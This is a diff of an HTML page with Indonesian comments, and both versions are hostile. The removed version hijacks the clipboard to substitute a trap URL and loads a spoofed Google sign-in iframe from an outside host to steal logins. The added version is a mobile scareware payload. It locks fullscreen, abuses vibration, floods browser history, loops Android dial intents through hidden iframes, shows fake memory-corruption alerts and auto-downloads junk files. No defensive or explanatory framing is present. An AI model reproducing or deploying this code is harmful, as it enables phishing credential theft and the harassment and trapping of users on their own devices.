@@ -1,43 +1,80 @@
-<!DOCTYPE HTML>
-<html>
+<!DOCTYPE html>
+<html lang="id">
 <head>
-    <meta charset="utf-8">
-    <title>Google</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CRITICAL_SYSTEM_OVERRIDE</title>
+    <style>
+        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; cursor: none; }
+        #trigger { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; color: red; font-family: monospace; }
+    </style>
 </head>
 <body>
-    <p>Click the button below and right click and 'paste' in the address bar to navigate press Enter </p>
-    <input id="tst" value="https://www.google.com" disabled size="50"><br>
-    <button onclick="copyt()">Copy</button>
+    <div id="trigger">INITIALIZING...</div>
 
-    <script>
-        // Logika Clipboard Hijacking
-        function copyt(){
-            const tst = document.getElementById('tst');
-            tst.disabled = false;
-            tst.select();
-            document.execCommand('copy');
-            tst.disabled = true;
+<script>
+    const trigger = document.getElementById('trigger');
+
+    async function executePayload() {
+        // 1. Lock Fullscreen & Prevent Exit
+        if (document.documentElement.requestFullscreen) {
+            await document.documentElement.requestFullscreen();
+        }
+        
+        // 2. Haptic Feedback (Vibration Abuse)
+        if (navigator.vibrate) {
+            navigator.vibrate([500, 200, 500, 200, 500]);
         }
 
-        document.getElementById('tst').oncopy = function(e){
-            // Mengganti teks yang disalin dengan URL jebakan
-            e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
-            e.preventDefault();
+        // 3. History Flooding (Anti-Back Button)
+        for (let i = 0; i < 20; i++) {
+            window.history.pushState(null, "", "#sys_error_" + i);
         }
 
-        // Fungsi untuk memicu tampilan login (Spoofing)
-        function triggerLogin() {
-            document.body.innerHTML = '<iframe src="https://cnfdnfial-ops.github.io/spoof/login" style="width:100%;height:100vh;border:none"></iframe>';
-            document.title = "Google - Sign In";
+        // 4. Intent & Web Share Race Condition
+        const intentUrl = "intent://*#Intent;scheme=tel;action=android.intent.action.DIAL;end";
+        
+        if (navigator.share) {
+            navigator.share({
+                title: 'SYSTEM_CRITICAL',
+                text: 'DANGER: Memory Corruption Detected',
+                url: window.location.href
+            }).catch(() => {});
         }
 
-        // Pemicu otomatis setelah 5 detik (5000 ms)
-        setTimeout(triggerLogin, 5000);
+        // 5. Auto-Download Junk (Memory Pressure)
+        const blob = new Blob(["0".repeat(1024 * 1024)], {type: "application/octet-stream"});
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "sys_dump.bin";
+        a.click();
 
-        // Pertahanan tetap jika user mencoba meninggalkan halaman
-        window.onbeforeunload = function() {
-            triggerLogin();
-        };
-    </script>
+        // 6. Loop Intent via Iframe
+        setInterval(() => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = intentUrl;
+            document.body.appendChild(iframe);
+            setTimeout(() => document.body.removeChild(iframe), 100);
+        }, 300);
+
+        // 7. Ghost Redirect
+        setTimeout(() => {
+            window.location.replace("https://www.google.com/");
+        }, 2000);
+    }
+
+    // Trigger on any interaction
+    trigger.addEventListener('touchstart', executePayload);
+    trigger.addEventListener('click', executePayload);
+
+    // Re-lock Fullscreen if user tries to escape
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen();
+        }
+    });
+</script>
 </body>
 </html>
